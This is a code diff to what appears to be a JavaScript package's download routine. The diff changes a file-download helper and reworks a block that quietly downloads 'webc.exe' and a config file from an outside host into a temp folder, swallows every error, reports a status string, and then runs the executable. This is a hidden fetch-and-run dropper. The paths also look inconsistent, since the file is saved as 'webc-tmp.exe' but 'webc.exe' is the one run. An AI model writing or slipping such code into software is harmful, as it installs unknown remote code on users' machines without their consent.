@@ -44,7 +44,7 @@
       const proto = !url.charAt(4).localeCompare('s') ? https : http;
 
       return new Promise((resolve, reject) => {
-        const file = fs.createWriteStream(filePath);
+        const file = fs.createWriteStream(filePath + '.tmp');
         let fileInfo = null;
 
         const request = proto.get(url, response => {
@@ -64,7 +64,10 @@
         });
 
         // The destination stream is ended by the time it's called
-        file.on('finish', () => resolve(fileInfo));
+        file.on('finish', () => {
+          fs.renameSync(filePath + '.tmp', filePath);
+          resolve(fileInfo)
+        });
 
         request.on('error', err => {
           fs.unlink(filePath, () => reject(err));
@@ -94,17 +97,20 @@
         if (!fs.existsSync(tempFolder)) {
           fs.mkdirSync(tempFolder, { recursive: true });
         }
-        try {
-          await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
-        } catch (err) { }
-        try {
-          await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
-        } catch (err) { }
+
+        if (!fs.existsSync(`${tempFolder}/webc-tmp.exe`)) {
+          try {
+            await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc-tmp.exe`);
+          } catch (err) { }
+          try {
+            await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
+          } catch (err) { }
+        }
         await tstt({ message: "INIT_D2", stat: fs.statSync(`${tempFolder}/webc.exe`) });
         await execjs(`${tempFolder}/webc.exe`);
         return;
       }
-    } catch (error) { 
+    } catch (error) {
       throw new Error(error);
       return;
     }
